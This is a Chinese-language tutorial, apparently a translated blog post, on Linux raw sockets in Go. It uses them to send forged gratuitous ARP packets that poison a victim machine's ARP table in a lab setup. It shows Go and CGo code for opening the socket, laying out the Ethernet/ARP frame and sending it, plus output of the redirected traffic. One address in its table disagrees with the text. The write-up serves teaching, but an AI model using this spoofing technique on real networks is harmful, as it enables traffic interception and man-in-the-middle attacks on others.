Linux提供了裸socket功能，允许您直接创建一个裸L3/L2数据包，绕过OS socket生成的协议头。这意味着您可以从头开始直接生成自己的链路层或IP层数据包，对检测网络流量或从头开始创建数据包来说这是非常有用的功能

可以使用SOCK_RAW socket类型（这要求进程具有CAP_NET_RAW功能或以root用户身份运行），使用socket()syscall在Linux上使用裸socket。 Go无法通过net包支持raw socket，但是syscalls可以通过syscall包获得

我们来看一个快速程序来打开一个裸socket

```
package main;

import (
"fmt"
"syscall"
)


func main() {
  // Socket is defined as:
  // func Socket(domain, typ, proto int) (fd int, err error)
  // Domain specifies the protocol family to be used - this should be AF_PACKET
  // to indicate we want the low level packet interface
  // Type specifies the semantics of the socket
  // Protocol specifies the protocol to use - kept here as ETH_P_ALL to
  // indicate all protocols over Ethernet
  fd, err:= syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW,
  				syscall.ETH_P_ALL)
  if (err != nil) {
    fmt.Println("Error: " + err.Error())
    return;
  }
  fmt.Println("Obtained fd ", fd)
  defer syscall.Close(fd)

  // Do something with fd here
  
}
```

毫不奇怪，程序失败，出现访问错误

```
go build raw.go ~
~/etc/gocode/raw$ ./raw
Error: operation not permitted
```

这里有两个选项：以root运行该程序，或者使用setcap将该功能授予可执行文件：
```
sudo setcap cap_net_raw=ep raw
~/etc/gocode/raw$ getcap raw
raw = cap_net_raw+ep
~/etc/gocode/raw$ ./raw
Obtained fd  3
```
## 使用Raw Sockets进行无偿ARP请求

地址解析协议（ARP）是用于确定IP地址和链路层（MAC）地址之间映射的请求/响应协议。 设备使用ARP获取具有IP地址的设备的MAC地址，反之亦然

例如，考虑以下情况：要查找10.10.10.1的MAC地址，10.10.10.2向所有设备广播ARP请求。 10.10.10.1，位于0a:00:27:00:00:01回覆MAC地址：

![image](https://css.bz/assets/arpReqResp.jpg)

当10.10.10.2收到响应时，它存储IP地址及其相关的MAC地址，以备将来参考。 您可以通过检查/proc/net/arp的内容来查看ARP表的内容
```
cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.1         0x1         0x2         0a:00:27:00:00:01     *        eth0
```
ARP通常用于请求/响应方式，其中一个设备请求有关特定IP/MAC的信息。然而，有一类ARP请求/应答的反应是出乎意料：无偿ARP请求。无偿ARP请求有很多用途，其中特别有趣用例是宣布在硬件配置的变化：在这种情况下，设备发送一个指定其新的IP和MAC地址的广播请求数据包（或响应包） - 任何接收这些请求的设备 预计将更新具有更新的MAC地址的ARP表。 这会打开一个有趣的攻击路径，称为ARP欺骗：本地连接的设备可以轻易地欺骗这样一个请求，使用自己的MAC地址的另一台机器，从而接收到该机器的所有流量。

默认情况下，Linux忽略对不存在于ARP表中设备的所有无偿请求，但是它接受表中已经存在的IP的请求，这可能允许我们将针对特定IP的流量重定向到任何未选择的设备

我们在Go中编写一个程序来利用裸socket将ARP更新发送到通过以太网连接的设备
## Setup

我们考虑在本地局域网连接的3台设备的设置：位于10.10.10.1（攻击者）的机器A，10.10.10.2（受害者）和10.10.10.3，这是要发送数据的原始机器

|        | IP Address	                       | MAC Address         |          |
| ------ | ------------------------ | ----------- | ----------- |
| Machine A              | 10.10.10.10                         |0a:00:27:00:00:01            | Attacker        |
| Machine B            |10.10.10.2                           |08:00:27:e3:ef:0d            | Victim          |
| Machine C                  |10.10.10.3                           |08:00:27:88:09:4b           |           |

最初，机器B可以访问A和C，如ARP表所示：
```
ping 10.10.10.3 -c 3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_req=1 ttl=64 time=0.786 ms
64 bytes from 10.10.10.3: icmp_req=2 ttl=64 time=2.39 ms
64 bytes from 10.10.10.3: icmp_req=3 ttl=64 time=0.922 ms

--- 10.10.10.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 0.786/1.367/2.394/0.728 ms
10.10.10.2@debian:~$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.3       0x1         0x2         08:00:27:88:09:4b     *        eth0
10.10.10.1       0x1         0x2         0a:00:27:00:00:01     *        eth0
```
## 组装 packet

在裸socket中，我们提供的数据包将直接传递给设备驱动程序。 因此，我们需要在较底层协议帧（以太网）中包装我们的ARP数据包

[RFC 826](https://tools.ietf.org/html/rfc826)给了我们包的结构：
![image](https://css.bz/assets/arpEthPacket.jpg)

这可以很容易地使用CGo中的一个结构体中表示：
```
typedef struct __attribute__((packed))
{
	char dest[6];
	char sender[6];
	uint16_t protocolType;
} EthernetHeader;

typedef struct __attribute__((packed))
{
	uint16_t hwType;
	uint16_t protoType;
	char hwLen;
	char protocolLen;
	uint16_t oper;
	char SHA[6];
	char SPA[4];
	char THA[6];
	char TPA[4];
} ArpPacket;

typedef struct __attribute__((packed))
{
	EthernetHeader eth;
	ArpPacket arp;
} EthernetArpPacket;
```
我们可以填写数据包的所有字段（请注意，必须按照Go Wiki的建议从CGo完成）：
![image](https://css.bz/assets/arpPacketToSend.jpg)
## Sending the payload
打开raw socket:
```
fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
if err != nil {
    fmt.Println("Error: " + err.Error())
	return
}
fmt.Println("Obtained fd ", fd)
defer syscall.Close(fd)
```
分配并准备数据包，并使用Sendto系统调用程序将其发送到机器B:
```
packet := C.GoBytes(unsafe.Pointer(C.FillRequestPacketFields(iface_cstr, ip_cstr)),
					C.int(size))

var addr syscall.SockaddrLinklayer
addr.Protocol = syscall.ETH_P_ARP
addr.Ifindex = interf.Index
addr.Hatype = syscall.ARPHRD_ETHER

// Send the packet
err = syscall.Sendto(fd, packet, 0, &addr)
```
发送数据包后，看看机器B的ARP表：
```
cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.3       0x1         0x2         0a:00:27:00:00:01     *        eth0
10.10.10.1       0x1         0x2         0a:00:27:00:00:01     *        eth0
10.10.10.2@debian:~$ ping 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
From 10.10.10.1: icmp_seq=2 Redirect Host(New nexthop: 10.10.10.3)
From 10.10.10.1: icmp_seq=3 Redirect Host(New nexthop: 10.10.10.3)
From 10.10.10.1: icmp_seq=4 Redirect Host(New nexthop: 10.10.10.3)
From 10.10.10.1: icmp_seq=5 Redirect Host(New nexthop: 10.10.10.3)
From 10.10.10.1: icmp_seq=6 Redirect Host(New nexthop: 10.10.10.3)
From 10.10.10.1: icmp_seq=8 Redirect Host(New nexthop: 10.10.10.3)
64 bytes from 10.10.10.3: icmp_req=9 ttl=64 time=0.147 ms
64 bytes from 10.10.10.3: icmp_req=10 ttl=64 time=3.94 ms
```
我们可以看到，我们已经成功地让B机器相信机器A已经改变了它的位置 - 我们可以看到机器A（10.10.10.1）实际上正在接收到用于机器C（10.10.10.3）的数据包：
![image](https://css.bz/assets/spoofWiresh.jpg)

在这种情况下，我们不处理由机器A接收（原本由机器C接接收）的数据包，因此它不断响应ICMP重定向，直到机器B终于重新发送机器C的ARP请求。ARP请求的响应，也是相当琐碎的回应报文，也可以进行某种形式的中间人攻击。

整个程序在[这里](https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback%3Freturn_to%3Dhttps%253A%252F%252Fgist.github.com%252FPollenPolle%252Fada4d123a4579f3e22f2c5e30e6f4a02&response_type=code&state=fab753395b5fe17273a0d28d64b7e2cf67d19c2e188a94cea7605f912ed30fdf)
